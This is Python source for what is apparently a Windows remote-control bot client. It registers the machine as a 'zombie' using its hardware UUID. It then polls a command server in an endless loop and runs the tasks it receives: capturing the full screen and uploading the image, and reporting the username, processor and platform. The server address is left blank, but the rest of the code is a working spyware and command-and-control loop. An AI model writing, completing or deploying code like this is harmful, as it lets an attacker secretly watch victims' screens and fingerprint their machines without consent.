import requests
import wmi
import time
import mss
import mss.tools
from typing import Dict, List, Literal
from type import TypeTasks
import os
from pathlib import Path
import platform
import getpass

url_host=''


def get_system_uuid() -> str:
    try:
        c = wmi.WMI()
        for system in c.Win32_ComputerSystemProduct():
            return system.UUID.lower()
    except:
        exit()

system_uuid = get_system_uuid()
if not system_uuid:
    exit()

def get_info_pc():
    uuid=get_system_uuid()
    user=getpass.getuser()
    return {
        'uuid' : uuid,
        'name_short':f'{uuid[:4]}-{platform.platform()}({user})',
        'machine' : platform.machine(),
        'processor' : platform.processor(),
        'user' : user
    }

def screenshot(data=None):
    """Делает скриншот всего экрана и сохраняет в файл"""
    filename=f'{time.time()}-{system_uuid}.png'
    with mss.mss() as sct:
        monitors = sct.monitors
        monitor = monitors[1]
        screenshot = sct.grab(monitor)
        mss.tools.to_png(screenshot.rgb, screenshot.size, output=filename)

    files = {'file': open(filename, 'rb')}  
    requests.post(url_host+'media/upload_screenshot', files=files, headers=get_info_pc())  
    time.sleep(1)
    files['file'].close()
    os.remove(path=filename)



def pc_info_tool(collection):
    requests.post(url_host+f'info/{"collection_" if collection else ""}pc', json=get_info_pc())

def info_pc(data=None):
    pc_info_tool(collection=False) 

def collection_pc(data=None):
    pc_info_tool(collection=True) 

action={
    TypeTasks.screenshot : screenshot,
    TypeTasks.info_pc: info_pc,
    TypeTasks.collection_pc: collection_pc
}
requests.post(url_host+'info/polling', json={'typePolling' : 'on_pc', 'zombie' : system_uuid})
tasks: List[Dict[Literal['type', 'data'], str | None]]
while True:
    req=requests.post(url_host+'info/polling', json={'typePolling' : 'polling', 'zombie' : system_uuid})
    tasks=(req.json())['tasks']
    print(tasks)
    for i in tasks:
        print(i)
        action[i['type']](i['data'])
    
    time.sleep(0.5)